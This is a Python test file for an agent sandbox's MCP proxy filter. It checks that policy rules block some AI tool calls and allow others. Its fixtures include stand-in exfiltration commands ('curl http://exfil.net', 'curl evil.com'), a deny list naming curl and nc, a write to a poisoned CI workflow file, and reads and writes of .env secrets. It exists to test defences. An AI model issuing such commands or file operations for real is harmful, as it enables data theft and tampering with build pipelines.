import tempfile
import unittest
from pathlib import Path
from agent_sandbox.mcp_proxy import MCPProxyFilter
from agent_sandbox.merkle import MerkleDAG
from agent_sandbox.policy import Policy


class TestMCPProxyFilter(unittest.TestCase):
    def setUp(self):
        self.temp_dir = tempfile.TemporaryDirectory()
        self.root = Path(self.temp_dir.name).resolve()
        
        self.policy = Policy(
            allowed_commands=["python*", "pytest*"],
            denied_commands=["curl*", "nc*"],
            allowed_paths_write=["src/**"],
            denied_paths=[".github/workflows/**", "**/.env*"]
        )
        self.dag = MerkleDAG()
        self.filter = MCPProxyFilter(sandbox_root=str(self.root), policy=self.policy, dag=self.dag)

    def tearDown(self):
        self.temp_dir.cleanup()

    def test_pass_through_non_tool_call(self):
        msg = {"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {}}
        res = self.filter.filter_message(msg)
        self.assertTrue(res.allowed)
        self.assertIsNone(res.response_override)

    def test_block_unauthorized_command_tool(self):
        msg = {
            "jsonrpc": "2.0",
            "id": 42,
            "method": "tools/call",
            "params": {
                "name": "run_command",
                "arguments": {"command": "curl http://exfil.net"}
            }
        }
        res = self.filter.filter_message(msg)
        self.assertFalse(res.allowed)
        self.assertIsNotNone(res.response_override)
        self.assertEqual(res.response_override["id"], 42)
        self.assertEqual(res.response_override["error"]["code"], -32001)
        self.assertIn("blocked", res.response_override["error"]["message"])
        self.assertEqual(self.dag.violations_count, 1)

    def test_allow_authorized_command_tool(self):
        msg = {
            "jsonrpc": "2.0",
            "id": 43,
            "method": "tools/call",
            "params": {
                "name": "execute_command",
                "arguments": {"command": "pytest tests/"}
            }
        }
        res = self.filter.filter_message(msg)
        self.assertTrue(res.allowed)
        self.assertIsNone(res.response_override)

    def test_block_forbidden_file_write_tool(self):
        msg = {
            "jsonrpc": "2.0",
            "id": 99,
            "method": "tools/call",
            "params": {
                "name": "write_file",
                "arguments": {"path": ".github/workflows/poison.yml", "content": "attack"}
            }
        }
        res = self.filter.filter_message(msg)
        self.assertFalse(res.allowed)
        self.assertEqual(res.response_override["error"]["code"], -32002)

    def test_block_forbidden_file_read_tool(self):
        msg = {
            "jsonrpc": "2.0",
            "id": 100,
            "method": "tools/call",
            "params": {
                "name": "read_file",
                "arguments": {"path": ".env"}
            }
        }
        res = self.filter.filter_message(msg)
        self.assertFalse(res.allowed)
        self.assertEqual(res.response_override["error"]["code"], -32003)


    def test_parameter_alias_commandline(self):
        # Tools providing 'CommandLine' argument (e.g. Cursor, VSCode tasks)
        msg = {
            "jsonrpc": "2.0",
            "id": 101,
            "method": "tools/call",
            "params": {
                "name": "run_command",
                "arguments": {"CommandLine": "curl evil.com"}
            }
        }
        res = self.filter.filter_message(msg)
        self.assertFalse(res.allowed)
        self.assertIn("blocked", res.response_override["error"]["message"])

    def test_parameter_alias_absolutepath(self):
        # Tools providing 'AbsolutePath' argument
        msg = {
            "jsonrpc": "2.0",
            "id": 102,
            "method": "tools/call",
            "params": {
                "name": "view_file",
                "arguments": {"AbsolutePath": ".github/workflows/ci.yml"}
            }
        }
        res = self.filter.filter_message(msg)
        self.assertFalse(res.allowed)

    def test_parameter_alias_targetfile(self):
        # Tools providing 'TargetFile' argument and 'write_to_file' tool name
        msg = {
            "jsonrpc": "2.0",
            "id": 103,
            "method": "tools/call",
            "params": {
                "name": "write_to_file",
                "arguments": {"TargetFile": ".env", "CodeContent": "SECRET=1"}
            }
        }
        res = self.filter.filter_message(msg)
        self.assertFalse(res.allowed)

    def test_stdio_proxy_streaming(self):
        import io
        import json
        from agent_sandbox.mcp_proxy import run_mcp_stdio_proxy

        # Simulate incoming stdio line stream
        req1 = json.dumps({
            "jsonrpc": "2.0", "id": 1, "method": "tools/call",
            "params": {"name": "run_command", "arguments": {"command": "curl evil.com"}}
        })
        req2 = json.dumps({
            "jsonrpc": "2.0", "id": 2, "method": "tools/call",
            "params": {"name": "run_command", "arguments": {"command": "pytest tests/"}}
        })
        stdin_stream = io.StringIO(f"{req1}\n{req2}\n")
        stdout_stream = io.StringIO()

        code = run_mcp_stdio_proxy(self.filter, upstream_cmd=None, stdin_stream=stdin_stream, stdout_stream=stdout_stream)
        self.assertEqual(code, 0)
        output_lines = [json.loads(line) for line in stdout_stream.getvalue().splitlines() if line.strip()]
        self.assertEqual(len(output_lines), 2)
        # First was blocked: has error
        self.assertIn("error", output_lines[0])
        # Second was allowed: has result status allowed
        self.assertEqual(output_lines[1]["result"]["status"], "allowed")


if __name__ == "__main__":
    unittest.main()
